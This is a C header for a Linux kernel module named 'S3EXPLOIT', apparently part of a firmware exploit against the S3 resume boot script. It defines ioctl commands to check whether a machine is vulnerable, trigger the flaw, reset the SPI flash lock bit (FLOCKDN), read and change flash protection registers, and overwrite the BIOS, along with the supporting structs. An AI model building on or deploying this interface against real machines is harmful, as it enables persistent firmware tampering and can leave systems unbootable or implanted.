#ifndef __S3EXPLOIT_IOCTL__
#define __S3EXPLOIT_IOCTL__

#include <linux/ioctl.h>
#include <linux/types.h>

#define IOCTL_BASE 'E'
#define S3EXPLOIT_GET_BOOTSCRIPT_ADDR _IOW(IOCTL_BASE, 0x10, uint8_t *) 
#define S3EXPLOIT_GET_BOOTSCRIPT_SIZE _IOW(IOCTL_BASE, 0x11, size_t *)
#define S3EXPLOIT_GET_BOOTSCRIPT      _IOW(IOCTL_BASE, 0x12, uint8_t *)
#define S3EXPLOIT_CHECK_IF_VULN       _IOW(IOCTL_BASE, 0x13, int)


#define S3EXPLOIT_RESET_FLOCKDN_BIT   _IO(IOCTL_BASE, 0x01)
#define S3EXPLOIT_TRIGGER_VULN        _IOR(IOCTL_BASE, 0x02, size_t)

#define S3EXPLOIT_GET_FLASH_INFO      _IOW(IOCTL_BASE, 0x03, struct spi_flash_info*)
#define S3EXPLOIT_SET_FLASH_INFO      _IOR(IOCTL_BASE, 0x04, struct spi_flash_info*)

#define S3EXPLOIT_OVERWRITE_BIOS       _IOW(IOCTL_BASE, 0x05, struct bios_overwrite_header*)

#define SPI_FLASH_INFO_FREG 1
#define SPI_FLASH_INFO_PR 2
#define SPI_FLASH_INFO_HSFS 4
#define SPI_FLASH_INFO_BIOS_CNTL 8
#define SPI_FLASH_INFO_ALL 0xf


struct spi_flash_info {
    uint32_t what;
    uint32_t freg[5];
    uint32_t pr[5];
    uint16_t hsfs;
    uint8_t bios_cntl;
};

struct bios_overwrite_header {
    const void *data;
    uint32_t size;
    uint32_t offset;
};

#endif
